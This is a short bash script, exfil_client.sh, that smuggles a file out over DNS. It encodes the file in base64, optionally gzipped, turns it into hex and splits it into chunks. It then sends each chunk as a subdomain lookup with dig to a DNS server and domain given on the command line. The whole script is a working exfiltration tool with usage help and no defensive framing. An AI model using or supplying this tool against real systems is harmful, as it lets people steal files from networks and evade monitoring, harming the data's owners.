#!/bin/bash

# Function to display help
function display_help {
    echo "Usage: ./exfil_client.sh <file_path> <domain> <dns_server_ip> <use_gzip>"
    echo "Exfiltrates a file over DNS by sending base64 encoded chunks as DNS queries."
    echo ""
    echo "Parameters:"
    echo "  file_path      Path to the file you want to exfiltrate."
    echo "  domain         Domain to use in DNS queries."
    echo "  dns_server_ip  IP address of the DNS server."
    echo "  use_gzip       Set to 'true' to gzip the file before encoding; otherwise, set to 'false'."
    echo ""
    echo "Example:"
    echo "  ./exfil_client.sh /path/to/your/file example.com 8.8.8.8 true"
}

# Check if there are 4 arguments
if [ "$#" -ne 4 ]; then
    display_help
    exit 1
fi

file_path="$1"
domain="$2"
dns_server_ip="$3"
use_gzip="$4"

data=$(cat "$file_path")

if [ "$use_gzip" = "true" ]; then
    # Compress file using gzip and base64 encode
    compressed_data=$(gzip -c "$file_path" | base64 -w0)
else
    # Base64 encode without gzip compression
    compressed_data=$(base64 -w0 "$file_path")
fi

max_chunk_length=62

for ((i=0; i<${#compressed_data}; i+=max_chunk_length)); do
    chunk=$(echo -n "${compressed_data:i:max_chunk_length}" | hexdump -v -e '/1 "%02x" ')
    chunk_1="${chunk:0:$((${#chunk} / 2 ))}"
    chunk_2="${chunk:$((${#chunk} / 2 ))}"
    subdomain="${chunk_1}-.${chunk_2}-.${domain}"
    dig @$dns_server_ip $subdomain
done